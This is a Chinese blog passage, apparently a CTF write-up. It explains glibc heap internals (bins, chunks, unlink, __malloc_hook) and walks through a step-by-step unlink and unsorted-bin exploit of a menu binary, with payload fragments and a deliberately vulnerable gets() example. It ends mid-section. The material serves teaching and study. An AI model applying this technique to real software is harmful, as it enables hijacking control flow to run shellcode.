<p>选项2：可以释放一片堆空间，下标自定义（0~9）</p>
<p>选项3：可以更改某一次申请堆空间的数据（大小可以不同）</p>
<p>​        //必须在bss段检测到<strong>选项1</strong>生成的指针才会执行</p>
<p><strong>漏洞分析</strong></p>
<p>首先有<strong>UAF</strong>，申请的指针没有置空</p>
<p>其次还有<strong>数组越位</strong>：</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638889038496-1639312327095.png" alt="1638889038496"> </p>
<p>可以发现，下标“v0”只检查了上界，没有检查下界，造成其可以为负数</p>
<p>没有开<strong>NX</strong>，那么堆中可以写入shellcode</p>
<p>在本函数中，没有检测大小就直接写入，明显的<strong>堆溢出漏洞</strong>  </p>
<p><strong>入侵思路</strong></p>
<p>本程序开了<strong>Full</strong>，GOT表不可改，堆中的shellcode不能借助函数的plt来控制<strong>CS:IP</strong></p>
<p>所以这里选择控制<strong>malloc_hook</strong>来执行shellcode</p>
<hr>
<p><strong>Hook</strong></p>
<p>Hook直意为钩子又叫做回调函数，是一种特殊的消息处理机制，它可以监视系统或者进程中的各种事件消息，截获发往目标窗口的消息并进行处理 </p>
<p>在程序中设置钩子，用来在<strong>malloc</strong>， <strong>realloc</strong>，<strong>free</strong>的时候，对其进行检查，可以看到对应的函数调用后的地址是什么</p>
<p>原理：</p>
<p>函数的指针可以指向不同的函数，从而完成不同的功能</p>
<p>设计理念：</p>
<p>我们在写main函数的时候，可能还不知道它会完成什么功能，这时候留下函数指针作为接口，可以挂上不同的函数完成不同的功能，究竟执行什么功能由钩子函数的编写者完成</p>
<p>案例：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &quot;stdio.h&quot;</span></span><br><span class="line"> </span><br><span class="line">void fun1(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(<span class="string">&quot;i am fun1\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void fun2(void)</span><br><span class="line">&#123;</span><br><span class="line">    printf(<span class="string">&quot;i am fun2\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">int</span> main(<span class="built_in">int</span> argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    void (* fun)(void); //定义一个函数指针</span><br><span class="line">  </span><br><span class="line">    fun = fun1;		// 让fun指向fun1（首地址）</span><br><span class="line">    fun();			// 执行fun</span><br><span class="line">    </span><br><span class="line">    fun = fun2;   	// 让fun指向fun2（首地址）</span><br><span class="line">    fun(); 			// 执行fun</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638893957283-1639312427470.png" alt="1638893957283"> </p>
<p>这里的函数“fun1”和函数“fun2”就是hook</p>
<p>把函数指针fun指向fun1和fun2的过程称为“挂钩子” </p>
<p>​        // 在嵌入式系统中，底层不知道应用层需要完成什么功能， 往往会提供像这样子的函数回调方式供应用层使用 </p>
<p><strong>malloc_hook</strong></p>
<p>malloc_hook本质上讲是一个指针变量，指向一个“检查函数”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">function</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">void</span> * caller)</span>	</span></span><br></pre></td></tr></table></figure>
<p>​         //其中caller是表示在栈中调用malloc的函数的时候的函数地址，%p可以打印出它的地址 </p>
<p>在执行malloc时，会检测__malloc_hook的值，如果malloc_hook的值存在（已经挂钩），将调用malloc_hook指向的<strong>call rax</strong>的地址（malloc调用之后的地址） </p>
<p>简单来说：执行<strong>malloc</strong>时，<strong>malloc_hook</strong>也会执行</p>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">fun</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __malloc_hook = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello,fun was called!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __malloc_hook = fun;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>malloc_hook</strong>指向了<strong>fun</strong>的首地址（挂钩子）</p>
<p>程序在执行<strong>malloc</strong>时就会执行<strong>fun</strong>，而不是“检查函数”（钩子已切换）</p>
<p>利用：</p>
<p>malloc_hook位于main_arena上方<strong>0x10</strong>的位置，可以通过fake chunk来overwrite该值实现getshell</p>
<p><strong>堆管理机制：bin</strong></p>
<p>一个链表被称为一个bin，简单来说bin就是<strong>free chunk的容器</strong></p>
<p>用户 free 掉的内存并不是都会马上归还给系统，<strong>ptmalloc 会统一管理 heap 和 mmap 映射区中空闲的 chunk</strong>，当用户进行下一次分配请求时，ptmalloc 会在空闲的 chunk 中选择一个合适的分配给他，这样就避免了频繁地系统调用</p>
<p><strong>ptmalloc</strong> 把大小相似的 chunk，用双向链表连接起来，这样就形成了一个 bin。ptmalloc 一共维护了 128 个这样的 bin，并使用数组来存储这些 bin 如下：</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638959281581-1639312548300.png" alt="1638959281581"> </p>
<p>从第2个到第64个bin是small bin，small bin中的chunk<strong>大小相同</strong>，small bin是一个双向链表</p>
<p>在某一条bin中(chunk大小相同)按照<strong>「先入先出」</strong>进行排序，也就是说，刚被释放的放在前面</p>
<p>​        //所以<strong>UAF</strong>中：刚刚释放的内存空间，可以被<strong>立刻</strong>重新申请</p>
<p><strong>unsorted bin</strong>是一段特殊的bin，由free chunks组成的循环双链表，当释放较小或较大的chunk的时候，如果系统没有将它们添加到对应的bins中，系统就将这些chunk添加到<strong>unsorted bin</strong>中 </p>
<p>在使用malloc申请内存时，如果在“fastbin”和“smallbin”中都没有找到合适的free chunk，程序就会在unsorted bin中进行<strong>遍历</strong>，寻找合适的free chunk，并且对其<strong>进行排序</strong>并<strong>重新分配</strong>到bins中</p>
<p><strong>堆管理机制：chunk</strong></p>
<p><strong>1.allocated chunk</strong>：当前chunk是被应用层用户所使用的</p>
<p><strong>2.free chunk</strong>：当前chunk是空闲的，没有被应用层用户所使用</p>
<p><strong>3.top chunk</strong>：</p>
<p>当一个chunk处于一个arena的最顶部(即最高内存地址处)的时候，就称之为top chunk</p>
<p>该chunk并<strong>不属于任何bin</strong>，而是在系统当前的<strong>所有free chunk</strong>(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用 </p>
<p><strong>4.last remainter chunk</strong>：</p>
<p>如果在bins链中存在freechunk时，当我们去malloc的时候，malloc的请求大小比freechunk的大小小，那么arena就会切割这个freechunk给malloc使用，那么切割之后剩余的chunk就<strong>被称为“last remainder”</strong> </p>
<p><strong>堆管理机制：ptmalloc算法</strong></p>
<p>malloc的时候，不论malloc的大小，首先会去检查每个bins链（除去fastbins链）是否有与malloc相等大小的freechunk，如果没有就去检查bins链中是否有<strong>大的freechunk</strong>可以切割</p>
<p>如果存在，那么就切割大的freechunk，那么切割之后<strong>剩余</strong>的chunk成为<strong>last remainder</strong>，并且last remainder会被放入到<strong>unsorted bin</strong>中</p>
<p>如果没有<strong>大的free chunk</strong>可以切割，程序就会查询<strong>top chunk</strong>，如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1.用户请求的chunk，2.新的top chunk，否则，就需要扩展heap或分配新的heap了——在<strong>main arena</strong>中通过<strong>sbrk</strong>扩展heap，而在<strong>thread arena</strong>中通过<strong>mmap</strong>分配新的heap</p>
<p>可以作出以下示意图：</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638952496892-1639312615182.png" alt="1638952496892"></p>
<p>​        //切割unsortedbin其实就是 <strong>_int_malloc 函数</strong>的for大循环的第一步，切割smallbins、largebins其实就是 <strong>_int_malloc</strong> 函数的for大循环的第三步 </p>
<p><strong>堆溢出漏洞</strong> </p>
<p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数 </p>
<p>堆溢出和栈溢出不同，因为堆上没有<strong>IP控制指令</strong>，所以不能通过堆溢出来控制<strong>IP</strong></p>
<p>那么堆溢出的作用是：</p>
<p>1.覆盖下一个相邻的<strong>chunk</strong>的内容</p>
<p>2.利用堆的机制（如unlink等）来实现任意地址的写入（ <strong>Write-Anything-Anywhere</strong>），或控制堆块中的<strong>内容</strong>等效果，从而来控制程序的<strong>执行流</strong> </p>
<p>案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk;</span><br><span class="line">  chunk=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Get input:&quot;</span>);</span><br><span class="line">  gets(chunk);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个程序的主要目的是调用 malloc 分配一块堆上的内存，之后向这个堆块中写入一个字符串，如果输入的字符串过长会导致溢出 chunk 的区域并覆盖到其后的 top chunk 之中(实际上 puts 内部会调用 malloc 分配堆内存，覆盖到的可能并不是 top chunk) </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;===chunk</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020fe1</span> &lt;===top chunk</span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000021</span> &lt;===chunk</span><br><span class="line"><span class="number">0x602010</span>:   <span class="number">0x4141414141414141</span>  <span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x602020</span>:   <span class="number">0x4141414141414141</span>  <span class="number">0x4141414141414141</span> &lt;===top chunk(已被溢出)</span><br><span class="line"><span class="number">0x602030</span>:   <span class="number">0x4141414141414141</span>  <span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x602040</span>:   <span class="number">0x4141414141414141</span>  <span class="number">0x4141414141414141</span></span><br></pre></td></tr></table></figure>
<p>​        //chunk的头两个8字节：一个为“prev_size”，另一个为“size”</p>
<hr>
<p>入侵的最终目的是为了通过<strong>malloc_hook</strong>来执行shellcode</p>
<p>我们知道：执行malloc的时候会执行malloc_hook挂钩的函数，malloc_hook默认挂钩“检查函数”，只要把 malloc_hook 赋值为shellcode的首地址，那么在执行malloc后就可以执行shellcode了</p>
<p>要想malloc_hook可以挂钩shellcode，那么shellcode的地址必须确定，所以地址随机化的堆空间并不适合写入shellcode，要选择一片<strong>可写入的</strong>，<strong>较稳定的</strong>内存段（比如bss段）</p>
<p>最后可以利用<strong>堆溢出</strong>来完成<strong>Write-Anything-Anywhere</strong>，把shellcode写入bss段</p>
<p>本程序可以利用<strong>堆溢出</strong>修改<strong>chunk的结构</strong>，通过<strong>unlink</strong>修改buf数组中指针指向的位置（使其指向bss段），利用<strong>选项三</strong>把shellcode写入bss段，然后再利用<strong>选项三</strong>修改malloc_hook为bss段上shellcode的地址，最后执行 shellcode，详细过程如下：</p>
<p>1.调用<strong>选项一</strong>在堆上创建两个chunk（0x90），此时堆结构如下： </p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638983033061.png" alt="1638983033061"> </p>
<p>2.使用<strong>选项三</strong>修改<strong>chunk0</strong>的数据区（<strong>fk&amp;bk</strong>），在其中<strong>伪造</strong>一个chunk，并通过堆溢出修改chunk 1的pre_size</p>
<p>伪造chunk的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pre_size, size</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)<span class="comment">#最后一位为1（伪造P位）</span></span><br><span class="line"><span class="comment"># fd, bk</span></span><br><span class="line">payload += p64(buf - <span class="number">0x18</span>) + p64(buf - <span class="number">0x10</span>)<span class="comment">#伪造unlink的执行条件</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">14</span></span><br><span class="line"><span class="comment"># change chunk1 size</span></span><br><span class="line">payload += p64(<span class="number">0x90</span>) + p64(<span class="number">0xa0</span>)<span class="comment">#最后一位为0（伪造P位，使伪造chunk为free）</span></span><br></pre></td></tr></table></figure>
<p>payload写入后的堆结构： </p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639131559439-1639312904280.png" alt="1639131559439"> </p>
<p>3.使用<strong>选项二</strong>删除<strong>thunk 1</strong>（还未合并）</p>
<p><strong>ptmalloc</strong>通过伪造的P位识别到伪造chunk为free，于是把chunk 1和伪造chunk进行<strong>后向合并</strong></p>
<p>此时，“控制权”交给了伪造chunk，所有指向chunk1的指针都会指向伪造chunk</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639071587687.png" alt="1639071587687"> </p>
<p>​    //装入bss段的buf[1]中装有的指向chunk1的指针<strong>不会</strong>指向伪造chunk(它在<strong>合并之前</strong>就已经写定)</p>
<p>unlink之前会进行检查：</p>
<p>伪造chunk-&gt;fd-&gt;bk  是否 就是伪造chunk</p>
<p>伪造chunk-&gt;bk-&gt;fd  是否 就是伪造chunk</p>
<p>只要按照上述payload中<strong>fd&amp;bk</strong>的排布是符合条件的，这里有些复杂：</p>
<p>chunk-&gt;fd：“buf - 0x18”，buf[-3]</p>
<p>chunk-&gt;bk：“buf - 0x10”，buf[-2]</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639131511591-1639312964843.png" alt="1639131511591"> </p>
<p>虽然buf[-3]，buf[-2]这两个地方<strong>根本就没有</strong>chunk，但只要unlink检测到<strong>对应位置的对应值</strong>正确就行了</p>
<p>可以发现：chunk-&gt;fd-&gt;bk和chunk-&gt;bk-&gt;fd都<strong>占用</strong>了buf[0]这个位置，就是<strong>伪造chunk的首地址</strong></p>
<p>unlink之中的操作就有些微妙了：</p>
<p>伪造chunk-&gt;fd-&gt;bk（指针buf[0]） = 伪造chunk-&gt;bk（地址buf[-2]）</p>
<p>伪造chunk-&gt;bk-&gt;fd（指针buf[0]） = 伪造chunk-&gt;fd（地址buf[-3]）</p>
<p>先让buf[0]中的指针指向buf[-2]，然后再指向buf[-3]</p>
<p>​        //前3步操作的根本目的，就是unlink改变buf[0]中指针的指向，方便改变<strong>数组buf</strong>的结构</p>
<p>4.使用<strong>选项三</strong>编辑“buf[0]”（实际上写入了“buf[-3]”），在buf中伪造一个chunkX</p>
<p>伪造chunkX的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#填充buf[-3]~buf[-1]</span></span><br><span class="line">payload+=p64(bss)+p64(buf)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x20</span>)</span><br></pre></td></tr></table></figure>
<p>payload写入后的buf结构：</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639075035442.png" alt="1639075035442"> </p>
<p>buf[1]中写入了buf[0]的地址，buf[0]中写入了bss段的地址</p>
<p>buf[4]就是“chunkX”的首地址，pre_size为“0”，size为“0x20”</p>
<p>5.使用<strong>选项一</strong>申请两个大小为“0x100”的chunk（chunk2，chunk3）</p>
<p>前面伪造chunk和chunk1合并后，在<strong>top chunk</strong>中存放有一个“0x90+0x90+0x10”大小的free chunk</p>
<p>在申请第一段“0x100”的chunk时，<strong>top chunk</strong>中的chunk被切割为“0x90”</p>
<p>在申请第二段“0x100”的chunk时，<strong>top chunk</strong>中的chunk大小不够，需要继续申请</p>
<p>​        //这里是为了把<strong>top chunk</strong>消耗干净，让chunk3成为新的<strong>top chunk</strong></p>
<p>buf结构：</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639075348270.png" alt="1639075348270"> </p>
<p>堆结构：（chunk2，chunk3都处于allocate状态）</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639076000559.png" alt="1639076000559"> </p>
<p>6.使用<strong>选项二</strong>删除chunk2，此时chunk2不会进行合并，直接被收入unsorted bin（作为最后一个）</p>
<p>堆结构：</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639076501926.png" alt="1639076501926"> </p>
<p>7.使用<strong>选项三</strong>修改buf[2]，修改chunk2结构的payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)+p64(buf+<span class="number">0x8</span>*<span class="number">4</span>)<span class="comment">#修改fd&amp;bk</span></span><br></pre></td></tr></table></figure>
<p>chunk2已经是free状态，修改其<strong>fd</strong>为“0”，修改其<strong>bk</strong>为“buf+0x8*4”（buf[4]）</p>
<p>修改后的chunk2结构：</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639159269994.png" alt="1639159269994"> </p>
<p>因为“chunk2”属于“unsorted bin”，其<strong>bk</strong>指向“buf[4]”（“chunkX”的首地址）</p>
<p>这样的话之前在buf中伪造的“chunkX”也进入了unsorted bin（被强行连接）</p>
<p>8.使用<strong>选项一</strong>添加一个和chunk2一样大小的chunk4，这样unsorted bin中只剩下chunkX了</p>
<p>这里需要先分析一下ptmalloc的运算过程：</p>
<p>申请chunk4时，程序在small bins中没有找到结果，于是在unsorted bin中进行<strong>遍历</strong></p>
<p>因为“chunk2”排在“chunkX”前面，所以程序搜索到“chunk2”后<strong>终止</strong>，并不会<strong>重新分配</strong>“chunkX”</p>
<p>9.所以<strong>选项三</strong>在buf[1]（buf）写入payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(bss) + p64(buf) + p64(<span class="number">0</span>) * <span class="number">4</span> + <span class="string">&#x27;\x10&#x27;</span></span><br></pre></td></tr></table></figure>
<p>目的是修改buf[6]为“malloc_hook”</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639075035442.png" alt="1639075035442"> </p>
<p>buf[1]中写入了buf[0]的地址，buf[0]中写入了bss段的地址</p>
<p>buf[4]是chunkX，在它就是<strong>unsorted bin</strong>中的<strong>最后一位</strong>，所以它的<strong>fd&amp;bk</strong>应该指向一个固定偏移<strong>main_arena+XX</strong>，这里不需要知道它具体是多少，只要知道它和<strong>malloc_hook</strong>只有最后两位不同就可以了</p>
<p>在buf[1]中写入payload，而payload会实际写入buf[0]，前面的数据会依次填充“buf[0]~buf[5]”，而最后一位数据“\x10”会<strong>填入fd</strong>，因为计算机采用<strong>小端序</strong>，所以“\x10”会覆盖<strong>fd</strong>指针指向内容的最后两个字节，它正是<strong>main_arena+XX</strong>，它会被覆盖为<strong>malloc_hook</strong>（3C4B10）</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639154237609.png" alt="1639154237609"> </p>
<p>10.使用<strong>选项三</strong>在buf[0]中写入shellcode：</p>
<p>buf[0]装有bss段的首地址，所以shellcode会被写入bss段，且首地址已知</p>
<p>11.使用<strong>选项三</strong>在buf[6]中写入shellcode的地址：</p>
<p>buf[6]中装有<strong>malloc_hook</strong>，所以<strong>malloc_hook</strong>会和shellcode挂钩</p>
<p>12.使用<strong>选项一</strong>随便申请一段内存：</p>
<p>程序调用malloc时，会同时调用malloc_hook，就相当于调用了shellcode</p>
<hr>
<p><strong>unlink函数</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(malloc_chunk *P, malloc_chunk *BK, malloc_chunk *FD)</span></span></span><br><span class="line"><span class="function"></span>&#123;	<span class="comment">//p是某个结构体“malloc_chunk”的地址，*p就是结构体本身（进行了降阶）</span></span><br><span class="line">    FD = P-&gt;fd;		<span class="comment">//FD就是指向下一个结构体的指针</span></span><br><span class="line">    BK = P-&gt;bk;		<span class="comment">//BK就是指向上一个结构体的指针</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr(check_action,<span class="string">&quot;corrupted double-linked list&quot;</span>,P);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;	</span><br><span class="line">        FD-&gt;bk = BK;	<span class="comment">//FD-&gt;bk：下一个结构体中的last</span></span><br><span class="line">        BK-&gt;fd = FD;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>unlink是一个宏操作，用于将某一个空闲chunk 从其所处的双向链表中脱链</p>
<p>解释unlink函数：</p>
<p>FD-&gt;bk = BK：让P结构体的下一个结构体中的<strong>bk</strong>变为<strong>P本身的bk</strong></p>
<p>BK-&gt;fd = FD：让P结构体的上一个结构体中的<strong>fd</strong>变为<strong>P本身的fd</strong></p>
<p>就相当于跳过了<strong>P</strong>这个结构体，把<strong>FD</strong>和<strong>BK</strong>连接</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639014959836.png" alt="1639014959836"></p>
<p>unlink检查：</p>
<p>当前这个chunkP的后一个chunk的<strong>fd</strong> == chunkP 是否成立</p>
<p>当前这个chunkP的前一个chunk的<strong>bk</strong> == chunkP 是否成立</p>
<p><strong>unlink攻击</strong></p>
<p>unlink是利用glibc malloc的内存回收机制造成攻击的，核心就在于<strong>当两个free的堆块</strong>在<strong>物理</strong>上相邻时，会将他们<strong>合并</strong>，并将原来free的堆块在原来的链表中解链，加入新的链表中，但这样的合并是有条件的，向前或向后合并</p>
<p>将要进行<strong>向前</strong>还是<strong>向后</strong>合并，关键是看<strong>前一个</strong>和<strong>后一个</strong>chunk是否为free</p>
<p>1.将要被free的chunk的P位为“1” &gt; 进行向后合并（前一个chunk为free）</p>
<p>2.将要被free的chunk的<strong>next chunk</strong>为free &gt; 进行向前合并（后一个chunk为free）</p>
<p>​        //前向合并可以合并<strong>top chunk</strong>，这点经常被利用</p>
<p><strong>向前合并&amp;向后合并</strong>（先合并，后unlink）</p>
<p>一，向后合并：（向后扩充，需要free的chunk作为“<strong>合成材料</strong>”）</p>
<p>通过P位检测<strong>前一个</strong>chunk是否为free，将要free的chunk会根据它自己的 <strong>size</strong> 来获取 <strong>前一块chunk的size</strong> ，并把它自己的size加到<strong>前一块chunk的size</strong>中，然后让新的chunk进入unlink流程</p>
<p>例子：</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638982092225.png" alt="1638982092225"> </p>
<p>当<strong>chunk2</strong>将要进行free时，发现<strong>chunk1</strong>已经是free状态，先<strong>unlink</strong> chunk1，然后进行<strong>向后合并</strong></p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1638982103542.png" alt="1638982103542"> </p>
<p>最终指向<strong>chunk1</strong>和<strong>chunk2</strong>的指针也会指向<strong>新的chunk</strong></p>
<p>二，前向合并：（向前扩充，需要free的chunk作为“<strong>合成材料</strong>”）</p>
<p>通过<strong>inuse_bit_at_offset</strong>检测<strong>后一个</strong>chunk是否为free，将要free的chunk会把它自己size加上nextsize（后一个chunk的大小），然后让新的chunk进入unlink流程</p>
<p>​        //这里pre_size的值没有改变，所以不需要进行操作</p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639027341437.png" alt="1639027341437"> </p>
<p>当<strong>chunk1</strong>将要进行free时，发现<strong>chunk2</strong>已经是free状态，先<strong>unlink</strong> chunk2，然后进行<strong>向前合并</strong></p>
<p><img src="/2021/12/12/%E5%A0%86%E6%BA%A2%E5%87%BA+malloc_hook%E5%8A%AB%E6%8C%81/1639027400761.png" alt="1639027400761"> </p>
<p>最终指向<strong>chunk1</strong>和<strong>chunk2</strong>的指针也会指向<strong>新的chunk</strong></p>
<p><strong>Arena- 管理线程中的堆</strong></p>
<p>Arena 是一种管理系统仿真模拟软件，它给c语言提供了接口，使其可以使用它的功能</p>
<p>功能：</p>
<p>一个线程申请的1个/多个堆包含很多的信息：二进制位信息，多个malloc_chunk信息……</p>
<p>而Arena就是用于管理这些信息的</p>
<p>特点：</p>
<p>1.一个线程只有一个arnea，并且这些线程的arnea都是独立的不是相同的</p>
<p>2.主线程的arnea被称为<strong>main_arena</strong>，子线程的arnea称为<strong>thread_arena</strong></p>
<p><strong>malloc_hook劫持（arena）</strong></p>
<p>先看malloc_trim函数，它可以之前分配的内存还给系统，源码如下：</p>
